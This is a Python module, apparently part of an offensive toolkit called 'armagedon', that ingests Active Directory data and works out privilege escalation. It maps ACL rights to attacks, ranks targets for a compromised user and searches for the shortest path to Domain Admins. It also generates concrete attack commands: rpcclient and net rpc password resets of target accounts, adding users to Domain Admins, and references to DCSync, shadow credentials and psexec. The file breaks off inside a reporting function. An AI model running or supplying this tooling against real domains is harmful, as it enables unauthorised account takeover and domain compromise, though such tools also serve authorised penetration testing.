"""
Domain Intelligence Engine

Ingests full AD domain information from multiple sources, builds a complete
object graph, and identifies outbound object control for any compromised user.

Supported ingest sources:
  1. ldapdomaindump output (domain_users.grep, domain_groups.grep, etc.)
  2. BloodHound JSON (users.json, groups.json, etc.)
  3. Live LDAP enumeration via nxc ldap

Provides:
  - Full domain object inventory (users, groups, computers, OUs, GPOs)
  - Outbound object control map per user (ACL edges, group membership, delegation)
  - Extended rights analysis (ForceChangePassword, AddMember, GenericAll, etc.)
  - Target value ranking (DA, EA, Schema Admins, high-value groups)
  - Shortest path to high-value targets
  - Attack recommendation per control type
"""

import csv
import json
import logging
import os
import re
import subprocess
from collections import defaultdict, deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

log = logging.getLogger("armagedon.core.domain_intel")


# ── Well-known SID patterns ──────────────────────────────────────────────────
HIGH_VALUE_GROUP_NAMES = {
    "domain admins", "enterprise admins", "schema admins",
    "builtin\\administrators", "administrators",
    "account operators", "backup operators", "server operators",
    "dnsadmins", "exchange windows permissions",
    "privileged access management", "delegated administration",
    "group policy creator owners",
}

HIGH_VALUE_SID_SUFFIXES = {
    "512": "Domain Admins",
    "518": "Schema Admins",
    "519": "Enterprise Admins",
    "544": "BUILTIN\\Administrators",
    "500": "Administrator",
}


# ── ACL Rights → Attack mapping ──────────────────────────────────────────────
CONTROL_TO_ATTACK = {
    "ForceChangePassword": {
        "attack": "password_reset",
        "tool": "rpcclient / net rpc",
        "command": "rpcclient -U '{user}%{pass}' {dc} -c 'setuserinfo2 {target_rid} 23 {new_pass}'",
        "severity": "critical",
        "description": "Reset target user password without knowing old password",
        "requires": ["rpc_access_to_dc"],
    },
    "AddMember": {
        "attack": "group_membership",
        "tool": "net rpc",
        "command": "net rpc group addmem '{group}' '{target}' -U '{user}%{pass}' -S {dc}",
        "severity": "critical",
        "description": "Add target to a group (e.g., Domain Admins)",
        "requires": ["rpc_access_to_dc"],
    },
    "GenericAll": {
        "attack": "full_control",
        "tool": "multiple",
        "commands": {
            "password_reset": "rpcclient setuserinfo2",
            "add_to_group": "net rpc group addmem",
            "rbcd": "rbcd.py / RBCD-Toolkit",
            "shadow_credentials": "pywhisker / Whisker",
            "dcsync": "secretsdump.py",
        },
        "severity": "critical",
        "description": "Full control — can reset password, add to groups, DCSync, RBCD",
        "requires": ["rpc_access_to_dc"],
    },
    "WriteDACL": {
        "attack": "write_dacl",
        "tool": "dacledit.py / GenericAll via WriteDACL",
        "description": "Write DACL — can grant Self/FullControl then chain to GenericAll",
        "severity": "high",
    },
    "WriteOwner": {
        "attack": "write_owner",
        "tool": "owneredit.py / GenericAll via WriteOwner",
        "description": "Change owner → grant Self FullControl → chain to GenericAll",
        "severity": "high",
    },
    "AddSelf": {
        "attack": "add_self",
        "tool": "net rpc",
        "description": "Add yourself to a group",
        "severity": "high",
    },
    "AllExtendedRights": {
        "attack": "extended_rights",
        "tool": "varies",
        "description": "All extended rights — includes ChangePassword, SetInfo",
        "severity": "high",
    },
    "AddKeyCredentialLink": {
        "attack": "shadow_credentials",
        "tool": "pywhisker / Whisker",
        "description": "Add Key Credential — can forge certificates for impersonation",
        "severity": "critical",
    },
    "AllowedToDelegate": {
        "attack": "constrained_delegation",
        "tool": "getST.py",
        "description": "Constrained delegation — can impersonate users to specific services",
        "severity": "high",
    },
    "HasSession": {
        "attack": "session_hijack",
        "tool": "token_steal / Rubeus",
        "description": "User has session on computer — can steal token",
        "severity": "high",
    },
    "AdminTo": {
        "attack": "admin_access",
        "tool": "psexec / wmiexec / smbexec",
        "description": "Admin access to computer — can execute commands",
        "severity": "critical",
    },
    "CanRDP": {
        "attack": "rdp_access",
        "tool": "xfreerdp / rdesktop",
        "description": "Can RDP to computer",
        "severity": "medium",
    },
    "CanPSRemote": {
        "attack": "ps_remote",
        "tool": "Invoke-PSRemoting / Enter-PSSession",
        "description": "Can PowerShell Remoting to computer",
        "severity": "medium",
    },
    "ExecuteDCOM": {
        "attack": "dcom_exec",
        "tool": "dcomexec.py / MMC20.Application",
        "description": "Can execute via DCOM on computer",
        "severity": "high",
    },
}


@dataclass
class DomainObject:
    """A single AD object."""
    sid: str = ""
    sam_account_name: str = ""
    cn: str = ""
    display_name: str = ""
    object_class: str = ""  # user, group, computer, ou, gpo, domain
    dn: str = ""
    enabled: bool = True
    description: str = ""
    member_of: List[str] = field(default_factory=list)   # SIDs of groups this object is member of
    members: List[str] = field(default_factory=list)      # SIDs of members (for groups)
    service_principal_names: List[str] = field(default_factory=list)
    admin_count: bool = False
    dont_expire_password: bool = False
    pwd_last_set: str = ""
    last_logon: str = ""
    os_version: str = ""
    dns_hostname: str = ""
    properties: Dict[str, Any] = field(default_factory=dict)

    @property
    def display(self) -> str:
        return self.display_name or self.sam_account_name or self.cn or self.sid

    @property
    def is_high_value(self) -> bool:
        if self.admin_count:
            return True
        name_lower = self.sam_account_name.lower()
        if name_lower in HIGH_VALUE_GROUP_NAMES:
            return True
        # Check SID suffix
        if self.sid:
            suffix = self.sid.rsplit("-", 1)[-1] if "-" in self.sid else ""
            if suffix in HIGH_VALUE_SID_SUFFIXES:
                return True
        return False


@dataclass
class ACLRight:
    """An ACE (Access Control Entry) — who has what right on whom."""
    principal_sid: str = ""        # SID of the grantee (who gets the right)
    principal_name: str = ""       # Name of the grantee
    principal_type: str = ""       # user, group, computer
    right_name: str = ""           # ForceChangePassword, GenericAll, etc.
    right_type: str = ""           # allowed, denied
    inherited: bool = False
    object_sid: str = ""           # SID of the object being controlled
    object_name: str = ""          # Name of the object being controlled


@dataclass
class OutboundControl:
    """What a specific user can do to a target object."""
    source_sid: str
    source_name: str
    target_sid: str
    target_name: str
    target_type: str               # user, group, computer
    right_name: str                # ForceChangePassword, AddMember, etc.
    attack_info: Dict[str, Any] = field(default_factory=dict)
    chain_value: int = 0           # higher = more useful for escalation


class DomainIntel:
    """Domain Intelligence Engine — ingest, analyze, and attack.

    Usage:
        intel = DomainIntel()
        intel.ingest_ldapdomaindump("/tmp/ldap_dump")
        # or
        intel.ingest_bloodhound_json("/path/to/bh/json")
        # or
        intel.ingest_live(dc_ip="10.0.0.1", domain="CORP", user="admin", password="pass")

        # Analyze
        controls = intel.get_outbound_control("password-reset")
        targets = intel.rank_escalation_targets("password-reset")

        # Attack
        intel.recommend_attack("password-reset", "admCroccCrew")
    """

    def __init__(self):
        self.objects: Dict[str, DomainObject] = {}           # SID → DomainObject
        self.name_to_sid: Dict[str, str] = {}                # samAccountName (lower) → SID
        self.acl_entries: List[ACLRight] = []
        self.outbound_map: Dict[str, List[OutboundControl]] = defaultdict(list)  # source_sid → controls
        self.inbound_map: Dict[str, List[ACLRight]] = defaultdict(list)         # target_sid → who controls it
        self.domain_sid: str = ""
        self.domain_dn: str = ""
        self.dc_ip: str = ""
        self.domain: str = ""
        self._loaded = False
        self._source: str = ""

    # ══════════════════════════════════════════════════════════════════════════
    # INGEST — ldapdomaindump
    # ══════════════════════════════════════════════════════════════════════════

    def ingest_ldapdomaindump(self, directory: str) -> bool:
        """Ingest ldapdomaindump output directory.

        Expected files:
          domain_users.grep, domain_groups.grep, domain_computers.grep,
          domain_controllers.grep, domain_policy.grep, *.json (if available)
        """
        directory = Path(directory)
        if not directory.is_dir():
            log.error("Not a directory: %s", directory)
            return False

        log.info("Ingesting ldapdomaindump from %s", directory)
        self._source = "ldapdomaindump"

        # Parse .grep files (tab-separated)
        users_file = directory / "domain_users.grep"
        groups_file = directory / "domain_groups.grep"
        computers_file = directory / "domain_computers.grep"
        controllers_file = directory / "domain_controllers.grep"

        if users_file.exists():
            self._parse_users_grep(users_file)
        if groups_file.exists():
            self._parse_groups_grep(groups_file)
        if computers_file.exists():
            self._parse_computers_grep(computers_file)
        if controllers_file.exists():
            self._parse_controllers_grep(controllers_file)

        # Try to parse JSON files (more detailed, includes ACLs)
        for jf in directory.glob("*.json"):
            try:
                data = json.loads(jf.read_text(errors="ignore"))
                if isinstance(data, dict) and "data" in data:
                    self._parse_bh_json_objects(data["data"])
                elif isinstance(data, list):
                    self._parse_bh_json_objects(data)
            except (json.JSONDecodeError, KeyError):
                pass

        # Also try to ingest raw LDIF files
        for ldif in directory.glob("*.ldif"):
            self._parse_ldif(ldif)

        self._loaded = len(self.objects) > 0
        if self._loaded:
            self._build_outbound_map()
            log.info(
                "Ingested %d objects (%d users, %d groups, %d computers), %d ACL entries",
                len(self.objects),
                sum(1 for o in self.objects.values() if o.object_class == "user"),
                sum(1 for o in self.objects.values() if o.object_class == "group"),
                sum(1 for o in self.objects.values() if o.object_class == "computer"),
                len(self.acl_entries),
            )
        return self._loaded

    def _parse_users_grep(self, filepath: Path):
        """Parse domain_users.grep (tab-separated with header)."""
        try:
            lines = filepath.read_text(errors="ignore").splitlines()
            if not lines:
                return
            # First line is header
            header = lines[0].split("\t")
            header = [h.strip().lower().replace(" ", "_") for h in header]

            for line in lines[1:]:
                parts = line.split("\t")
                if len(parts) < 2:
                    continue
                vals = {header[i]: parts[i].strip() if i < len(parts) else "" for i in range(len(header))}

                sid = vals.get("objectsid", "") or vals.get("sid", "")
                sam = vals.get("samaccountname", "") or vals.get("name", "")
                cn = vals.get("cn", "") or sam
                dn = vals.get("distinguishedname", "")

                if not sid and not sam:
                    continue

                obj = DomainObject(
                    sid=sid,
                    sam_account_name=sam,
                    cn=cn,
                    display_name=vals.get("displayname", cn),
                    object_class="user",
                    dn=dn,
                    enabled=vals.get("useraccountcontrol", "512") != "514",
                    description=vals.get("description", ""),
                    admin_count=vals.get("admincount", "0") == "1",
                    dont_expire_password=bool(int(vals.get("useraccountcontrol", "0")) & 0x10000),
                    pwd_last_set=vals.get("pwdlastset", ""),
                    last_logon=vals.get("lastlogon", ""),
                    properties=vals,
                )

                # Parse memberOf (semicolon-separated DNs)
                member_of_raw = vals.get("memberof", "")
                if member_of_raw:
                    # We'll resolve DNs to SIDs after all objects are loaded
                    obj.properties["_member_of_dns"] = [m.strip() for m in member_of_raw.split(";") if m.strip()]

                if not sid:
                    # Generate a temp SID from samAccountName
                    sid = f"TEMP-{sam.lower()}"
                    obj.sid = sid

                self.objects[sid] = obj
                self.name_to_sid[sam.lower()] = sid
        except Exception as e:
            log.error("Failed to parse %s: %s", filepath, e)

    def _parse_groups_grep(self, filepath: Path):
        """Parse domain_groups.grep (tab-separated)."""
        try:
            lines = filepath.read_text(errors="ignore").splitlines()
            if not lines:
                return
            header = lines[0].split("\t")
            header = [h.strip().lower().replace(" ", "_") for h in header]

            for line in lines[1:]:
                parts = line.split("\t")
                if len(parts) < 2:
                    continue
                vals = {header[i]: parts[i].strip() if i < len(parts) else "" for i in range(len(header))}

                sid = vals.get("objectsid", "") or vals.get("sid", "")
                sam = vals.get("samaccountname", "") or vals.get("name", "")

                if not sid and not sam:
                    continue

                if not sid:
                    sid = f"TEMP-{sam.lower()}"

                if sid in self.objects:
                    obj = self.objects[sid]
                    obj.object_class = "group"
                else:
                    obj = DomainObject(
                        sid=sid,
                        sam_account_name=sam,
                        cn=vals.get("cn", sam),
                        object_class="group",
                        dn=vals.get("distinguishedname", ""),
                        description=vals.get("description", ""),
                        properties=vals,
                    )
                    self.objects[sid] = obj
                    self.name_to_sid[sam.lower()] = sid

                # Parse members (semicolon-separated DNs)
                members_raw = vals.get("member", "") or vals.get("members", "")
                if members_raw:
                    obj.properties["_member_dns"] = [m.strip() for m in members_raw.split(";") if m.strip()]
        except Exception as e:
            log.error("Failed to parse %s: %s", filepath, e)

    def _parse_computers_grep(self, filepath: Path):
        """Parse domain_computers.grep (tab-separated)."""
        try:
            lines = filepath.read_text(errors="ignore").splitlines()
            if not lines:
                return
            header = lines[0].split("\t")
            header = [h.strip().lower().replace(" ", "_") for h in header]

            for line in lines[1:]:
                parts = line.split("\t")
                if len(parts) < 2:
                    continue
                vals = {header[i]: parts[i].strip() if i < len(parts) else "" for i in range(len(header))}

                sid = vals.get("objectsid", "") or vals.get("sid", "")
                sam = vals.get("samaccountname", "") or vals.get("name", "")
                dnshostname = vals.get("dnshostname", "")

                if not sid and not sam:
                    continue
                if not sid:
                    sid = f"TEMP-{sam.lower()}"

                obj = DomainObject(
                    sid=sid,
                    sam_account_name=sam.rstrip("$"),
                    cn=vals.get("cn", sam),
                    display_name=dnshostname or sam,
                    object_class="computer",
                    dn=vals.get("distinguishedname", ""),
                    dns_hostname=dnshostname,
                    os_version=vals.get("operatingsystem", ""),
                    enabled=True,
                    properties=vals,
                )

                self.objects[sid] = obj
                self.name_to_sid[sam.lower().rstrip("$")] = sid
        except Exception as e:
            log.error("Failed to parse %s: %s", filepath, e)

    def _parse_controllers_grep(self, filepath: Path):
        """Parse domain_controllers.grep — mark as high-value."""
        try:
            lines = filepath.read_text(errors="ignore").splitlines()
            if not lines:
                return
            header = lines[0].split("\t")
            header = [h.strip().lower().replace(" ", "_") for h in header]

            for line in lines[1:]:
                parts = line.split("\t")
                if len(parts) < 2:
                    continue
                vals = {header[i]: parts[i].strip() if i < len(parts) else "" for i in range(len(header))}
                sam = vals.get("samaccountname", "") or vals.get("name", "")
                if sam:
                    key = sam.lower()
                    if key in self.name_to_sid:
                        obj = self.objects.get(self.name_to_sid[key])
                        if obj:
                            obj.admin_count = True
                            obj.properties["isdc"] = True
        except Exception as e:
            log.error("Failed to parse %s: %s", filepath, e)

    def _parse_ldif(self, filepath: Path):
        """Basic LDIF parser for ACL and memberOf resolution."""
        try:
            content = filepath.read_text(errors="ignore")
            # Split into entries
            entries = re.split(r'\n\n+', content)
            for entry in entries:
                if not entry.strip() or entry.startswith("#"):
                    continue
                # Look for ACL entries (nTSecurityDescriptor or securityDescriptor)
                # This is complex — we primarily rely on grep files and JSON
                pass
        except Exception:
            pass

    def _resolve_dn_references(self):
        """Resolve DN-based references (memberOf, member) to SIDs after all objects loaded."""
        # Build DN → SID mapping
        dn_to_sid = {}
        for obj in self.objects.values():
            if obj.dn:
                dn_to_sid[obj.dn.lower()] = obj.sid

        # Resolve memberOf
        for obj in self.objects.values():
            member_of_dns = obj.properties.get("_member_of_dns", [])
            for dn in member_of_dns:
                target_sid = dn_to_sid.get(dn.lower())
                if target_sid:
                    obj.member_of.append(target_sid)
                    target_obj = self.objects.get(target_sid)
                    if target_obj:
                        target_obj.members.append(obj.sid)

        # Clean up temp properties
        for obj in self.objects.values():
            obj.properties.pop("_member_of_dns", None)
            obj.properties.pop("_member_dns", None)

    # ══════════════════════════════════════════════════════════════════════════
    # INGEST — BloodHound JSON
    # ══════════════════════════════════════════════════════════════════════════

    def ingest_bloodhound_json(self, directory_or_file: str) -> bool:
        """Ingest BloodHound JSON files."""
        path = Path(directory_or_file)
        self._source = "bloodhound_json"

        json_files = []
        if path.is_dir():
            json_files = sorted(path.glob("*.json"))
        elif path.is_file():
            json_files = [path]

        if not json_files:
            log.error("No JSON files found: %s", directory_or_file)
            return False

        for jf in json_files:
            try:
                data = json.loads(jf.read_text(errors="ignore"))
                if isinstance(data, list):
                    self._parse_bh_json_objects(data)
                elif isinstance(data, dict):
                    if "data" in data:
                        self._parse_bh_json_objects(data["data"])
                    else:
                        self._parse_bh_json_objects([data])
            except (json.JSONDecodeError, Exception) as e:
                log.warning("Skipping %s: %s", jf.name, e)

        self._loaded = len(self.objects) > 0
        if self._loaded:
            self._build_outbound_map()
        return self._loaded

    def _parse_bh_json_objects(self, objects: list):
        """Parse BloodHound JSON objects into DomainObjects + ACLs."""
        for obj in objects:
            oid = obj.get("ObjectIdentifier") or obj.get("objectid") or obj.get("id", "")
            if not oid:
                continue

            props = obj.get("Properties", obj.get("properties", {}))
            obj_type = (
                props.get("objecttype", "").lower()
                or obj.get("ObjectType", "").lower()
                or "unknown"
            )

            domain_obj = DomainObject(
                sid=oid,
                sam_account_name=props.get("samaccountname", ""),
                cn=props.get("name", ""),
                display_name=props.get("name", ""),
                object_class=obj_type,
                enabled=props.get("enabled", True),
                admin_count=props.get("admincount", False),
                description=props.get("description", ""),
                properties=props,
            )

            # Parse SPNs
            spns = props.get("hasspn", []) or props.get("serviceprincipalnames", [])
            if spns:
                domain_obj.service_principal_names = spns if isinstance(spns, list) else [spns]

            # Parse ACLs (ACEs)
            aces = obj.get("Aces", obj.get("aces", []))
            for ace in aces:
                right = ace.get("RightName", ace.get("rightname", ""))
                principal_sid = ace.get("PrincipalSID", ace.get(" principalsid", ""))
                inherited = ace.get("IsInherited", ace.get("isinherited", False))

                if not inherited and principal_sid and right:
                    acl = ACLRight(
                        principal_sid=principal_sid,
                        principal_name=ace.get("PrincipalName", ""),
                        principal_type=ace.get("PrincipalType", ""),
                        right_name=right,
                        object_sid=oid,
                        object_name=props.get("name", ""),
                        inherited=inherited,
                    )
                    self.acl_entries.append(acl)

            # Parse Members
            members = obj.get("Members", obj.get("members", []))
            for m in members:
                mid = m.get("MemberId", m.get("memberid", m.get("objectid", "")))
                if mid:
                    domain_obj.members.append(mid)

            # Parse Sessions
            sessions = obj.get("Sessions", obj.get("sessions", []))
            for s in sessions:
                uid = s.get("UserId", s.get("userid", ""))
                if uid:
                    domain_obj.properties.setdefault("sessions", []).append(uid)

            self.objects[oid] = domain_obj
            if domain_obj.sam_account_name:
                self.name_to_sid[domain_obj.sam_account_name.lower()] = oid

    # ══════════════════════════════════════════════════════════════════════════
    # INGEST — Live LDAP via nxc
    # ══════════════════════════════════════════════════════════════════════════

    def ingest_live(self, dc_ip: str, domain: str, user: str, password: str,
                    extra_hosts: str = "") -> bool:
        """Live LDAP enumeration via nxc ldap modules."""
        self._source = "live_ldap"
        self.dc_ip = dc_ip
        self.domain = domain

        # Build nxc auth string
        auth = f"-u '{user}' -p '{password}' -d '{domain}'"

        # 1. Get all users via ldapsearch
        log.info("Live LDAP: enumerating users on %s", dc_ip)
        cmd = f"nxc ldap {dc_ip} {auth} --search '(&(objectClass=user))' --attributes 'sAMAccountName cn distinguishedName memberOf userAccountControl description adminCount servicePrincipalName' --output-format json 2>/dev/null"
        self._run_and_parse_ldap_json(cmd, "user")

        # 2. Get all groups
        log.info("Live LDAP: enumerating groups")
        cmd = f"nxc ldap {dc_ip} {auth} --search '(&(objectClass=group))' --attributes 'sAMAccountName cn distinguishedName member description' --output-format json 2>/dev/null"
        self._run_and_parse_ldap_json(cmd, "group")

        # 3. Get all computers
        log.info("Live LDAP: enumerating computers")
        cmd = f"nxc ldap {dc_ip} {auth} --search '(&(objectClass=computer))' --attributes 'sAMAccountName cn distinguishedName dNSHostName operatingSystem' --output-format json 2>/dev/null"
        self._run_and_parse_ldap_json(cmd, "computer")

        # 4. Get OUs and GPOs
        log.info("Live LDAP: enumerating OUs and GPOs")
        cmd = f"nxc ldap {dc_ip} {auth} --search '(objectClass=organizationalUnit)' --attributes 'cn distinguishedName' --output-format json 2>/dev/null"
        self._run_and_parse_ldap_json(cmd, "ou")

        # 5. ACL dump via ldapsearch
        log.info("Live LDAP: enumerating ACLs")
        cmd = f"nxc ldap {dc_ip} {auth} --search '(objectClass=*)' --attributes 'nTSecurityDescriptor distinguishedName sAMAccountName' --output-format json 2>/dev/null"
        self._run_and_parse_ldap_json(cmd, "acl")

        self._loaded = len(self.objects) > 0
        if self._loaded:
            self._build_outbound_map()
            log.info("Live LDAP: ingested %d objects, %d ACLs", len(self.objects), len(self.acl_entries))
        return self._loaded

    def _run_and_parse_ldap_json(self, cmd: str, obj_type: str):
        """Run nxc ldap command and parse JSON output."""
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            if r.returncode != 0 and not r.stdout.strip():
                log.debug("nxc ldap command failed (type=%s): %s", obj_type, r.stderr[:200])
                return

            # Try to parse JSON output
            output = r.stdout.strip()
            if not output:
                return

            # nxc output may have non-JSON lines before the actual data
            # Try to find JSON array or object
            json_start = output.find("[")
            if json_start == -1:
                json_start = output.find("{")
            if json_start == -1:
                return

            try:
                data = json.loads(output[json_start:])
            except json.JSONDecodeError:
                return

            if isinstance(data, dict):
                data = [data]

            for entry in data:
                if not isinstance(entry, dict):
                    continue

                sid = entry.get("objectSid", "") or entry.get("objectsid", "")
                sam = entry.get("sAMAccountName", "")
                cn = entry.get("cn", "")
                dn = entry.get("distinguishedName", "")

                if not sid and not sam:
                    continue
                if not sid:
                    sid = f"LDAP-{sam.lower()}"

                if obj_type == "user":
                    uac = int(entry.get("userAccountControl", "512"))
                    obj = DomainObject(
                        sid=sid, sam_account_name=sam, cn=cn, display_name=cn,
                        object_class="user", dn=dn,
                        enabled=not bool(uac & 2),
                        description=entry.get("description", ""),
                        admin_count=entry.get("adminCount", "0") == "1",
                        properties=entry,
                    )
                elif obj_type == "group":
                    obj = DomainObject(
                        sid=sid, sam_account_name=sam, cn=cn, display_name=cn,
                        object_class="group", dn=dn, properties=entry,
                    )
                elif obj_type == "computer":
                    obj = DomainObject(
                        sid=sid, sam_account_name=sam.rstrip("$"), cn=cn,
                        display_name=entry.get("dNSHostName", sam),
                        object_class="computer", dn=dn,
                        dns_hostname=entry.get("dNSHostName", ""),
                        os_version=entry.get("operatingSystem", ""),
                        properties=entry,
                    )
                elif obj_type == "ou":
                    obj = DomainObject(
                        sid=sid, sam_account_name=sam or cn, cn=cn,
                        object_class="ou", dn=dn, properties=entry,
                    )
                else:
                    continue

                self.objects[sid] = obj
                if sam:
                    self.name_to_sid[sam.lower()] = sid

        except subprocess.TimeoutExpired:
            log.warning("nxc ldap timed out (type=%s)", obj_type)
        except Exception as e:
            log.error("Failed to parse nxc ldap output (type=%s): %s", obj_type, e)

    # ══════════════════════════════════════════════════════════════════════════
    # GRAPH BUILDING & OUTBOUND CONTROL ANALYSIS
    # ══════════════════════════════════════════════════════════════════════════

    def _build_outbound_map(self):
        """Build outbound object control map from ACL entries + group membership."""
        # Resolve DN references if we have them
        self._resolve_dn_references()

        # 1. ACL-based control
        for acl in self.acl_entries:
            if acl.right_name in CONTROL_TO_ATTACK:
                # Resolve names if missing
                if not acl.principal_name:
                    obj = self.objects.get(acl.principal_sid)
                    acl.principal_name = obj.display if obj else acl.principal_sid
                if not acl.object_name:
                    obj = self.objects.get(acl.object_sid)
                    acl.object_name = obj.display if obj else acl.object_sid

                target_obj = self.objects.get(acl.object_sid)
                target_type = target_obj.object_class if target_obj else "unknown"

                attack = CONTROL_TO_ATTACK.get(acl.right_name, {})
                ctrl = OutboundControl(
                    source_sid=acl.principal_sid,
                    source_name=acl.principal_name,
                    target_sid=acl.object_sid,
                    target_name=acl.object_name,
                    target_type=target_type,
                    right_name=acl.right_name,
                    attack_info=attack,
                    chain_value=self._calc_chain_value(acl.right_name, target_type, target_obj),
                )
                self.outbound_map[acl.principal_sid].append(ctrl)

        # 2. Group membership — members of DA/EA groups implicitly control all group members
        for sid, obj in self.objects.items():
            if obj.object_class != "group":
                continue
            if not obj.is_high_value:
                continue
            # Everyone who can add members to this group controls its members
            for acl in self.acl_entries:
                if acl.object_sid == sid and acl.right_name in ("AddMember", "GenericAll", "AllExtendedRights"):
                    # This user can add anyone to the high-value group
                    ctrl = OutboundControl(
                        source_sid=acl.principal_sid,
                        source_name=acl.principal_name or acl.principal_sid,
                        target_sid=sid,
                        target_name=obj.display,
                        target_type="group",
                        right_name=acl.right_name,
                        attack_info={
                            "attack": "add_to_high_value_group",
                            "description": f"Can add users to {obj.display}",
                            "severity": "critical",
                        },
                        chain_value=100,
                    )
                    self.outbound_map[acl.principal_sid].append(ctrl)

        # 3. Implicit controls via group membership
        # If user A is member of group G, and G has ForceChangePassword on user B,
        # then A can reset B's password (via group-level ACE)
        for acl in self.acl_entries:
            if acl.right_name not in CONTROL_TO_ATTACK:
                continue
            # Find all members of the principal (if it's a group)
            principal_obj = self.objects.get(acl.principal_sid)
            if principal_obj and principal_obj.object_class == "group":
                for member_sid in principal_obj.members:
                    member_obj = self.objects.get(member_sid)
                    target_obj = self.objects.get(acl.object_sid)
                    target_type = target_obj.object_class if target_obj else "unknown"

                    attack = CONTROL_TO_ATTACK.get(acl.right_name, {})
                    ctrl = OutboundControl(
                        source_sid=member_sid,
                        source_name=member_obj.display if member_obj else member_sid,
                        target_sid=acl.object_sid,
                        target_name=acl.object_name or (target_obj.display if target_obj else acl.object_sid),
                        target_type=target_type,
                        right_name=acl.right_name,
                        attack_info=attack,
                        chain_value=self._calc_chain_value(acl.right_name, target_type, target_obj) + 1,
                    )
                    self.outbound_map[member_sid].append(ctrl)

    def _calc_chain_value(self, right: str, target_type: str, target_obj: Optional[DomainObject]) -> int:
        """Calculate how useful this control is for escalation (higher = better)."""
        base = {
            "ForceChangePassword": 50,
            "GenericAll": 100,
            "WriteDACL": 60,
            "WriteOwner": 55,
            "AddMember": 80,
            "AddSelf": 40,
            "AllExtendedRights": 70,
            "AddKeyCredentialLink": 90,
            "AllowedToDelegate": 60,
            "HasSession": 40,
            "AdminTo": 80,
            "CanRDP": 30,
            "CanPSRemote": 35,
            "ExecuteDCOM": 50,
        }.get(right, 10)

        # Bonus for high-value targets
        if target_obj and target_obj.is_high_value:
            base += 50
        if target_type == "computer":
            base += 5
        return base

    # ══════════════════════════════════════════════════════════════════════════
    # QUERY — Outbound Object Control
    # ══════════════════════════════════════════════════════════════════════════

    def get_outbound_control(self, user: str) -> List[OutboundControl]:
        """Get all outbound object controls for a user (by samAccountName or SID)."""
        if not self._loaded:
            return []

        sid = self._resolve_user(user)
        if not sid:
            log.warning("User not found: %s", user)
            return []

        controls = self.outbound_map.get(sid, [])
        # Sort by chain_value (most valuable first)
        return sorted(controls, key=lambda c: -c.chain_value)

    def _resolve_user(self, user: str) -> str:
        """Resolve a username/SAM/SID to SID."""
        # Check if already a SID
        if user in self.objects:
            return user
        # Check by samAccountName
        sid = self.name_to_sid.get(user.lower())
        if sid:
            return sid
        # Check by display name
        for oid, obj in self.objects.items():
            if obj.display.lower() == user.lower():
                return oid
        return ""

    def get_inbound_control(self, target: str) -> List[ACLRight]:
        """Get who controls a specific target object."""
        sid = self._resolve_user(target)
        return [a for a in self.acl_entries if a.object_sid == sid]

    def rank_escalation_targets(self, compromised_user: str) -> List[OutboundControl]:
        """For a compromised user, rank all escalation targets by value.

        Returns outbound controls sorted by:
          1. Target value (DA/EA/Schema Admins first)
          2. Attack ease (ForceChangePassword > GenericAll > WriteDACL)
          3. Chain length (direct > indirect)
        """
        controls = self.get_outbound_control(compromised_user)

        # Filter to only user targets (password reset / group add are most useful)
        user_controls = [c for c in controls if c.target_type in ("user", "group")]
        computer_controls = [c for c in controls if c.target_type == "computer"]

        # Sort: high-value users first, then by chain_value
        def sort_key(c: OutboundControl) -> tuple:
            target_obj = self.objects.get(c.target_sid)
            hv = 100 if (target_obj and target_obj.is_high_value) else 0
            return (-hv, -c.chain_value)

        user_controls.sort(key=sort_key)
        return user_controls + computer_controls

    def find_shortest_path_to_da(self, compromised_user: str) -> Optional[List[OutboundControl]]:
        """Find shortest path from a user to Domain Admins via outbound control.

        BFS traversal of the outbound control graph.
        """
        start_sid = self._resolve_user(compromised_user)
        if not start_sid:
            return None

        # Find DA group SID
        da_sid = ""
        for sid, obj in self.objects.items():
            if obj.sam_account_name.lower() in ("domain admins",):
                da_sid = sid
                break
            if obj.sid and obj.sid.rsplit("-", 1)[-1] == "512":
                da_sid = sid
                break

        if not da_sid:
            log.warning("Domain Admins group not found")
            return None

        # BFS
        queue = deque([(start_sid, [])])
        visited = {start_sid}
        max_depth = 6

        while queue:
            current, path = queue.popleft()
            if len(path) > max_depth:
                continue

            # Check if current is in DA group or is DA itself
            if current == da_sid:
                return path
            current_obj = self.objects.get(current)
            if current_obj and da_sid in current_obj.member_of:
                return path

            # Follow outbound controls
            for ctrl in self.outbound_map.get(current, []):
                if ctrl.target_sid not in visited:
                    visited.add(ctrl.target_sid)
                    queue.append((ctrl.target_sid, path + [ctrl]))

        return None

    # ══════════════════════════════════════════════════════════════════════════
    # ATTACK RECOMMENDATION
    # ══════════════════════════════════════════════════════════════════════════

    def recommend_attack(self, compromised_user: str, target: str = "") -> Dict[str, Any]:
        """Recommend the best attack for a compromised user.

        If target is specified, focus on that specific target.
        Otherwise, recommend the highest-value target.
        """
        if target:
            # Find control on specific target
            controls = self.get_outbound_control(compromised_user)
            target_controls = [
                c for c in controls
                if c.target_name.lower() == target.lower() or c.target_sid == target
            ]
            if not target_controls:
                return {"error": f"No control found from {compromised_user} to {target}"}
            best = target_controls[0]
        else:
            # Find highest-value target
            ranked = self.rank_escalation_targets(compromised_user)
            if not ranked:
                return {"error": f"No outbound object control found for {compromised_user}"}
            best = ranked[0]

        attack_info = best.attack_info.copy()
        attack_info["source"] = best.source_name
        attack_info["target"] = best.target_name
        attack_info["target_type"] = best.target_type
        attack_info["right"] = best.right_name
        attack_info["chain_value"] = best.chain_value

        # Add specific commands if available
        if best.right_name in ("ForceChangePassword", "GenericAll"):
            target_obj = self.objects.get(best.target_sid)
            if target_obj and target_obj.object_class == "user":
                attack_info["example_commands"] = [
                    f"rpcclient -U '{compromised_user}%PASS' {self.dc_ip} -c 'lookupsids {best.target_sid}'",
                    f"rpcclient -U '{compromised_user}%PASS' {self.dc_ip} -c 'setuserinfo2 {best.target_sid.split('-')[-1]} 23 NewP@ss123'",
                    f"net rpc user setpass '{best.target_name}' 'NewP@ss123' -U '{compromised_user}%PASS' -S {self.dc_ip}",
                ]
        elif best.right_name == "AddMember":
            attack_info["example_commands"] = [
                f"net rpc group addmem 'Domain Admins' '{best.target_name}' -U '{compromised_user}%PASS' -S {self.dc_ip}",
            ]

        return attack_info

    # ══════════════════════════════════════════════════════════════════════════
    # REPORTING
    # ══════════════════════════════════════════════════════════════════════════

    def summary(self) -> Dict[str, Any]:
        """Domain summary statistics."""
        type_counts = defaultdict(int)
        for obj in self.objects.values():
            type_counts[obj.object_class] += 1

